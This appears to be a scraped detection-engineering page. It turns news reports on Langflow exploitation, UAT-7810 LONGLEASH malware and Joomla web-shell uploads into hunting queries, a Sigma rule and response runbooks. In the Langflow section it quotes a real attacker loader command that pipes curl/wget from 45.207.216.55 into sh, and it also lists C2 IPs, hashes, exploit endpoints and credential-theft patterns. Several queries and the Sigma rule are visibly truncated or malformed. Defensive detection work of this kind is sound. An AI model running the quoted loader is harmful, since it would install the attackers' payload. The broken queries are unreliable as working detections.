Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Langflow flow-ID enumeration chained to /api/v1/responses IDOR (CVE-2026-55255) · [LLM] Langflow unauth RCE payload POST to /api/v1/build_public_tmp (CVE-2026-33017)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Langflow host runs curl/wget piped to sh fetching /slt loader (45.207.216.55) · [LLM] Langflow exploitation marker file /tmp/lang_pwn created
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Langflow host beacons to JadePuffer/CVE-2026-55255 C2 (45.207.216.55:8084) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Langflow flow-ID enumeration chained to /api/v1/responses IDOR (CVE-2026-55255) AIExploitation High
Hunts the CVE-2026-55255 cross-tenant IDOR chain where one client first pulls GET /api/v1/flows/ to harvest flow UUIDs, then replays those UUIDs as the model parameter on POST /api/v1/responses to execute another user's flow. Article-specific because it correlates the exact enumeration-then-abuse endpoint pair on the same source within a short window. Rationale: Uses the exact Sysdig-documented sequence (GET /api/v1/flows/ harvest -> POST /api/v1/responses replay) confirmed in the Sysdig TRT blog; correlating the two Langflow endpoints on one source is far higher fidelity than either path alone. Defender AH has no inbound reverse-proxy request-path table, so defender_kql is intentionally empty. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://github.com/advisories/GHSA-qrpv-q767-xqq2
ATT&CKT1190 T1213
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Langflow power-user iterating flows via UI who hits /api/v1/flows/ then runs their OWN flow via /api/v1/responses
  • Automated CI/CD or synthetic-monitoring bot exercising the Langflow REST API
  • Internal load/perf test replaying enumerated flow IDs
  • Langflow admin auditing all flows across tenants for governance
Suppression filter
| where SrcIpAddr !in ("127.0.0.1") and DstIpAddr !in ("127.0.0.1")
Response runbook
1) TRIAGE: pull the app-layer Langflow logs for this SrcIpAddr and confirm the authenticated user's ID differs from the owner of the referenced flow_id UUID; check whether input body was 'leak api keys'. 2) CONTAIN: block the source IP at the WAF, force-rotate any LLM/cloud API keys stored in the affected flows, and pull the Langflow instance behind auth/VPN. 3) HUNT: pivot to the host for follow-on /api/v1/build_public_tmp RCE calls, curl/wget to 45.207.216.55, and the /tmp/lang_pwn marker.
let win = 30m;
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/v1/flows" or Url has "/api/v1/responses" or Url has "/api/v1/build_public_tmp"
| summarize Urls = make_set(Url, 50), Methods = make_set(HttpMethod), Reqs = count(), FirstSeen = min(TimeGenerated) by SrcIpAddr, DstIpAddr, bin(TimeGenerated, win)
| extend U = tostring(Urls)
| where U has "/api/v1/flows" and (U has "/api/v1/responses" or U has "/api/v1/build_public_tmp")
| project FirstSeen, SrcIpAddr, DstIpAddr, Methods, Reqs, Urls
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count values(Web.url) as urls values(Web.http_method) as methods min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows*" OR Web.url="*/api/v1/responses*" OR Web.url="*/api/v1/build_public_tmp*") by Web.src Web.dest span=30m | `drop_dm_object_name(Web)` | where match(urls,"/api/v1/flows") AND (match(urls,"/api/v1/responses") OR match(urls,"/api/v1/build_public_tmp")) | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count values(Web.url) as urls values(Web.http_method) as methods min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows*" OR Web.url="*/api/v1/responses*" OR Web.url="*/api/v1/build_public_tmp*") by Web.src Web.dest span=30m | `drop_dm_object_name(Web)` | where match(urls,"/api/v1/flows") AND (match(urls,"/api/v1/responses") OR match(urls,"/api/v1/build_public_tmp")) | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Langflow unauth RCE payload POST to /api/v1/build_public_tmp (CVE-2026-33017) AIExploitation High
Alerts on POST requests to the Langflow /api/v1/build_public_tmp/<uuid>/flow endpoint used to inject the malicious custom component that achieves code execution, plus the auto_login/api_key recon probes that precede it. This is inherently exploit traffic — legitimate clients do not build public temp flows against this API path. Rationale: The /api/v1/build_public_tmp/<uuid>/flow POST is the exact RCE payload-injection endpoint Sysdig captured for CVE-2026-33017, and /api/v1/auto_login is the documented no-auth recon probe; both are exploit-only paths. Defender AH lacks inbound web-request telemetry so defender_kql is empty by design. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1190 T1059
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Langflow security scanner / VA tool (Nessus, Nuclei) probing the same endpoints in an authorized scan
  • Internal red-team validation of the CVE-2026-33017 patch
  • Langflow health-check monitoring that hits /api/v1/auto_login on a no-auth default deployment
  • Developer testing a public temp flow build in a sandbox instance
Response runbook
1) TRIAGE: confirm Langflow version < 1.9.1 and whether the instance is internet-exposed; inspect the request body/response for injected component code and outbound-connection attempts. 2) CONTAIN: isolate the Langflow host, block the source IP, and snapshot for forensics before the loader executes. 3) HUNT: on the host look for child shells of the Langflow/uvicorn process, curl/wget to 45.207.216.55:8084/slt, and creation of /tmp/lang_pwn.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/v1/build_public_tmp" or Url has "/api/v1/auto_login"
| project TimeGenerated, SrcIpAddr, DstIpAddr, HttpMethod, Url, HttpStatusCode, HttpUserAgent = HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Langflow host runs curl/wget piped to sh fetching /slt loader (45.207.216.55) AIInstallation High
Detects the second-stage loader command executed via the Langflow RCE: a curl/wget to http://45.207.216.55:8084/slt piped into sh. This is the execution pivot on the compromised Linux AI host, spawned by the Langflow/python/uvicorn service account. Rationale: Matches the exact Sysdig-captured loader string '(curl -fsSL http://45.207.216.55:8084/slt || wget -q http://45.207.216.55:8084/slt) | sh' via the confirmed C2 IP plus the /slt path; the IP is corroborated by both the article and Sysdig TRT. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://hackread.com/sysdig-jadepuffer-first-agentic-ransomware-operation/
ATT&CKT1059.004 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Admin manually running curl/wget to that IP during IOC validation or threat-hunt reproduction
  • Security tool sandbox detonating the sample against the live C2
  • Legitimate internal artifact server that happens to share the /slt path (unlikely given the hard-coded attacker IP)
Suppression filter
| where InitiatingProcessAccountName !in~ ("root") or InitiatingProcessFileName has_any ("python","uvicorn","gunicorn","langflow","sh")
Response runbook
1) TRIAGE: confirm the parent is the Langflow/uvicorn/python service and pull the full process tree and download response. 2) CONTAIN: kill the process tree, network-isolate the host, and block 45.207.216.55 egress at the firewall. 3) HUNT: enumerate other hosts beaconing to 45.207.216.55:8084, look for the /tmp/lang_pwn marker, and check for harvested LLM/cloud API keys and pg_dump activity against the Langflow PostgreSQL DB.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "45.207.216.55" and ProcessCommandLine has_any ("/slt", "curl", "wget")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ProcessCommandLine has "45.207.216.55" and ProcessCommandLine has_any ("/slt", "curl", "wget")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName = TargetProcessName, ProcessCommandLine = TargetProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Langflow host beacons to JadePuffer/CVE-2026-55255 C2 (45.207.216.55:8084) AICommand & Control High
Detects outbound connections from a Langflow host to the campaign C2 infrastructure, primarily 45.207.216.55 on port 8084 (loader host), plus the additional campaign IPs. High-fidelity because the primary IP/port is confirmed by Sysdig as the /slt loader and beacon endpoint. Rationale: 45.207.216.55:8084 is the Sysdig-confirmed loader/C2 endpoint (both article and Sysdig TRT); 45.131.66.106 and 64.20.53.230 came from the article's IOC list and are shipped as lower-confidence secondary IOCs pending independent confirmation. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://www.securityweek.com/agentic-ai-used-to-conduct-ransomware-attack-via-langflow/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel enrichment/scanning platform (e.g. a TIP or Shodan-style scanner) connecting to the C2 for research
  • Analyst IOC-validation curl from a jump box
  • Sinkhole or takedown infrastructure now resolving the IP
  • Shared-hosting IP reuse if the VPS is later repurposed for benign services
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense","MonitoringHost") and not (DeviceName has_any ("scanner","ti-","honeypot"))
Response runbook
1) TRIAGE: identify the initiating process on the source host and confirm whether the connection targets port 8084 / the /slt URI. 2) CONTAIN: block all three IPs at the perimeter, isolate any beaconing host, and rotate LLM/cloud API keys reachable from that host. 3) HUNT: sweep for regular-interval callbacks (beacon cadence) to these IPs, the curl|sh loader process, /tmp/lang_pwn, and JadePuffer ransomware/pg_dump activity against Langflow's PostgreSQL DB.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("45.207.216.55", "45.131.66.106", "64.20.53.230")
| summarize Conns = count(), Ports = make_set(RemotePort), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by LastSeen desc
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in ("45.207.216.55", "45.131.66.106", "64.20.53.230")
| summarize Conns = count(), Ports = make_set(DstPortNumber), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcIpAddr, DstIpAddr, DvcHostname
| order by LastSeen desc

Langflow exploitation marker file /tmp/lang_pwn created AIInstallation High
Detects creation of the /tmp/lang_pwn marker file that the CVE-2026-55255/CVE-2026-33017 loader writes after successful exploitation on a Langflow host. A single, hard-coded artifact path unique to this campaign, making it a near-zero-FP confirmation of compromise. Rationale: /tmp/lang_pwn is the exact post-exploitation marker file Sysdig documented the loader writing on success; it is a unique, hard-coded artifact with essentially no benign collision. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1105 T1059.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst recreating the marker during IOC validation on a test host
  • Detection-engineering unit test seeding the file to validate this rule
  • Backup/restore of a previously compromised host image that still contains the artifact
Response runbook
1) TRIAGE: treat any real hit as confirmed compromise; identify the writing process and its Langflow-service parentage. 2) CONTAIN: isolate the host, preserve /tmp for forensics, block 45.207.216.55, and begin credential rotation (LLM/cloud keys, PostgreSQL). 3) HUNT: correlate with the curl|sh loader process, C2 beacons to 45.207.216.55:8084, inbound /api/v1/responses and /api/v1/build_public_tmp requests, and JadePuffer ransomware/pg_dump activity.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated", "FileModified")
| where FolderPath =~ "/tmp/lang_pwn" or FileName =~ "lang_pwn"
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath =~ "/tmp/lang_pwn" or TargetFileName =~ "lang_pwn"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"

// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Critical

China-Linked UAT-7810 Expands ORB Network With New LONGLEASH Malware

The Hacker News
2026-07-08 10 use cases 3 techniques 6 kill-chain phases detected

A Chinese threat actor tracked as UAT-7810 is actively refining its bespoke malware to expand its Operational Relay Box (ORB) network by breaking into internet-facing networking devices. According to findings from Cisco Talos, UAT-7810 is an advanced persistent threat (APT) actor that's responsible for maintaining and proliferating LapDogs, an ORB network that first came to light in June 2025.

ATT&CKT1190 T1486 T1555.003
IPs194.233.92.26 217.15.160.247 217.15.164.147 95.182.100.231

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] LONGLEASH / DOGLEASH / JARLEASH / LEASHTEST malware hash on Linux endpoints · Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Outbound C2 to UAT-7810 / LONGLEASH ORB relay infrastructure · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Outbound C2 to UAT-7810 / LONGLEASH ORB relay infrastructure AICommand & Control Medium
Hunts internal hosts connecting to the four UAT-7810 ORB relay servers that host LONGLEASH intermediate-C2 / multi-protocol proxy services on ports 8088, 2222 and a port-99 TLS listener bearing a self-signed 'C=exploit' certificate. Any egress from a defended asset to these dedicated relay IPs indicates the host is being used as (or is talking to) an ORB node. Rationale: Uses the four relay IPs (194.233.92.26, 217.15.160.247, 217.15.164.147, 95.182.100.231) confirmed by Talos; these are dedicated ORB relay hosts (ports 8088/2222/99, port-99 carrying the self-signed 'C=exploit' TLS cert fingerprint c2ab9adaba93ff094b8f3fc37d906014d870582039d276b7bd03e6fd583d8a15), so any contact is high-fidelity. Cross-checked against: • https://blog.talosintelligence.com/uat-7810/ • https://www.bleepingcomputer.com/news/security/chinese-hackers-develop-longleash-malware-to-expand-orb-network/ • https://expel.com/blog/gonzo-threat-hunting-lapdogs-shortleash/
ATT&CKT1090.003 T1571
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal threat-intel enrichment or sandbox detonation tooling actively probing the published IOC IPs
  • Vulnerability scanners / attack-surface tools sweeping the same hosting ranges
  • Security researcher workstation validating the Talos report
  • Shared-egress NAT where an unrelated third-party temporarily reuses one of these IPs (rare for dedicated relays)
  • Passive DNS / netflow collectors mirroring traffic that merely observed the IP
Suppression filter
| where not(InitiatingProcessFileName in~ ("nessus.exe","nmap.exe","vscan.exe") or InitiatingProcessFolderPath has_any (@"\ThreatIntel\", @"\Sandbox\"))
Response runbook
1) Triage: identify the internal source host and the initiating process/user; confirm the connection succeeded (bytes transferred) versus a blocked/failed attempt, and check the destination port (8088/2222/99). 2) Contain: block all four relay IPs at the perimeter, isolate the source host if the connection succeeded, and capture running processes and listening sockets on that host. 3) Hunt: pivot on the host for DOGLEASH/JARLEASH/LONGLEASH hashes (UC2), look for a local TLS listener on port 99 with the 'C=exploit' subject, and review whether the host is an internet-facing router/Linux appliance that may itself be an enrolled ORB node.

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, Protocol, InitiatingProcessFolderPath
| order by Timestamp desc
CommonSecurityLog

| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, SourceUserName, DestinationIP, DestinationPort, ApplicationProtocol, DeviceAction, RequestURL
| order by TimeGenerated desc

LONGLEASH / DOGLEASH / JARLEASH / LEASHTEST malware hash on Linux endpoints AIInstallation Medium
Detects the UAT-7810 implant binaries (LONGLEASH backdoor, JARLEASH Java admin backdoor and its startup script/config, LEASHTEST MIPS test ELF) by known SHA256 landing on or executing from onboarded Linux servers/appliances. Targets orgs whose internet-facing Linux hosts could be recruited into the ORB network. Rationale: Uses Talos-published SHA256 hashes for LEASHTEST (1b5649...), LONGLEASH (755fcee...), and two JARLEASH variants plus its startup-script/config hashes; exact-hash matches are zero-ambiguity IOCs, and the Java/ELF nature means they land on onboarded Linux/appliance hosts rather than Windows. Cross-checked against: • https://blog.talosintelligence.com/uat-7810/ • https://gbhackers.com/longleash-malware-attack/amp/
ATT&CKT1105 T1543
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware-analysis/sandbox VM where a responder intentionally stored the sample
  • Threat-intel team importing IOC sample sets into a research host
  • Backup/AV quarantine store retaining a copy of the flagged binary
  • SHA256 collision (cryptographically negligible)
  • Red-team emulation deliberately staging the same hash
Suppression filter
| where DeviceName !has "sandbox" and DeviceName !has "malware-lab" and FolderPath !has_any (@"/quarantine/", @"/threatintel/", @"/samples/")
Response runbook
1) Triage: confirm the host is production (not a sandbox/research VM), identify the file path and the process that wrote or executed it, and check whether execution actually occurred. 2) Contain: isolate the host from the network, snapshot for forensics, and kill/quarantine the binary plus any JARLEASH startup script and cron/systemd persistence. 3) Hunt: pull outbound netflow for connections to the four ORB relay IPs (UC1), search for a listening TLS socket on port 99 with the 'C=exploit' cert, and sweep the rest of the Linux estate for the same hashes and DOGLEASH variants.
let iocs = dynamic(["1b5649b479fd625de5c8120873644b5eb669cc89cd504582c18e0ae350fd8823","755fcee1337a252203002ecfdf673a08cfadeda8d738bef2d518a08e0626aa4f","324d95024fc8da5c92b5a1f4825aed5a2a91c9ca8fb6aa52abb332a4c9cf4257","bafba443170e54ef7fd431ce7f1b5e202719f3fd022e4ef70788904f574d2cdf","e799d72929d7ccc7f6b6109742b8cc482838303207efc989543b6e1ca6d16e9c","3b89d183eb014e29d9d0d4e45fc2b784a7fcfcf31dd48fd3bde30f8d956383d1"]);
union DeviceFileEvents, DeviceProcessEvents
| where Timestamp > ago(30d)
| where SHA256 in (iocs)
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let iocs = dynamic(["1b5649b479fd625de5c8120873644b5eb669cc89cd504582c18e0ae350fd8823","755fcee1337a252203002ecfdf673a08cfadeda8d738bef2d518a08e0626aa4f","324d95024fc8da5c92b5a1f4825aed5a2a91c9ca8fb6aa52abb332a4c9cf4257","bafba443170e54ef7fd431ce7f1b5e202719f3fd022e4ef70788904f574d2cdf","e799d72929d7ccc7f6b6109742b8cc482838303207efc989543b6e1ca6d16e9c","3b89d183eb014e29d9d0d4e45fc2b784a7fcfcf31dd48fd3bde30f8d956383d1"]);
ImFileEvent
| where TimeGenerated > ago(30d)

| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows

    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2020-22653", "CVE-2020-22658", "CVE-2023-25717", "CVE-2025-2492")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2020-22653", "CVE-2020-22658", "CVE-2023-25717", "CVE-2025-2492")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

LSASS process access / dump (credential theft) Actions on Objectives High

Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",

| project Timestamp, DeviceName, ActionType, FileName,

          InitiatingProcessFolderPath, AccountName

// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010

// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

JoomShaper SP Page Builder uploadCustomIcon unauth file upload (CVE-2026-48908) AIExploitation High
Hunts unauthenticated HTTP POSTs to the Joomla SP Page Builder asset.uploadCustomIcon endpoint used to drop PHP web shells as a zero-day. Article-specific because it keys on the exact vulnerable route (index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon) that preceded rogue Super User creation. Rationale: Anchored on the exact zero-day endpoint index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon named in the article and confirmed by mySites.guru; the parameter pair is unique to this exploit, giving near-zero benign traffic. Cross-checked against: • https://mysites.guru/blog/sp-page-builder-zero-day-uploadcustomicon-rce/ • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1190 T1505.003 T1136.001
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Joomla administrator uploading a custom icon through SP Page Builder in the admin UI
  • Vulnerability scanner (Nessus/Qualys) probing the endpoint as part of an authorized scan
  • WAF replay/testing traffic from an internal security team validating the patch
  • Synthetic monitoring hitting the admin route
Suppression filter
| where SourceIP != "<your-scanner-cidr>" is NOT used; instead: | where DeviceProduct !in ("Vulnerability Scanner") and RequestMethod == "POST"
Response runbook
1) Triage: confirm the source IP is external/unauthenticated and check the HTTP response code — a 200/201 with a small body suggests a successful upload. Pull the same src's prior requests for recon. 2) Contain: block the source IP at the WAF, take the site to maintenance mode, and confirm SP Page Builder is >=6.6.2; hunt the web root for newly created .php files and unexpected Super User accounts in the Joomla #__users table. 3) Hunt: pivot on any new admin/Super User account creation and subsequent logins, and search web logs for follow-on requests to any dropped PHP filename.
CommonSecurityLog | where TimeGenerated > ago(7d) | where RequestMethod == "POST" | where RequestURL has "com_sppagebuilder" and RequestURL has "asset.uploadCustomIcon" | project TimeGenerated, SourceIP, DestinationHostName, RequestURL, RequestMethod, DeviceProduct, DeviceVendor | order by TimeGenerated desc

Joomla Page Builder CK web shell drop under /media/com_pagebuilderck/ (CVE-2026-56290) AIInstallation High
Detects creation of PHP files (notably bhup.php) inside the Page Builder CK media directory following unauthenticated arbitrary file upload. Article-specific because it keys on the confirmed web shell path /media/com_pagebuilderck/gfonts/bhup.php and the attacker-chosen destination folder under com_pagebuilderck. Rationale: Uses the exact confirmed shell path /media/com_pagebuilderck/gfonts/bhup.php and the com_pagebuilderck destination directory from the article and mySites.guru; a legitimate Joomla extension does not create new PHP files under its media/gfonts folder at runtime. Cross-checked against: • https://mysites.guru/blog/pagebuilderck-unauthenticated-file-upload-rce/ • https://github.com/advisories/GHSA-gxrr-wfg5-xqqf
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Page Builder CK plugin update copying bundled PHP assets into com_pagebuilderck
  • Site admin restoring a backup that re-creates media files
  • Deployment automation (rsync/CI) repopulating the web root
  • Developer manually placing a debug .php file under /media for testing
Suppression filter
| where InitiatingProcessFileName !in~ ("dpkg","rpm","apt","composer","rsync") and FileName != "index.php"
Response runbook
1) Triage: read the dropped file — an uploader shell will reference $_POST['_upl'] or eval/system; capture the SHA256 and the writing process (php-fpm/httpd). 2) Contain: quarantine/delete the file, isolate the host, and block the src IPs seen accessing it; verify Page Builder CK is >=3.6.0. 3) Hunt: enumerate ALL stray .php outside expected locations under /media, /images, /templates, /administrator (attacker picks the folder), and correlate with web-log POSTs to those filenames and any outbound connections the web process made.
DeviceFileEvents | where Timestamp > ago(7d) | where ActionType == "FileCreated" | where FileName endswith ".php" | where FolderPath has "com_pagebuilderck" or FileName =~ "bhup.php" | project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, SHA256 | order by Timestamp desc
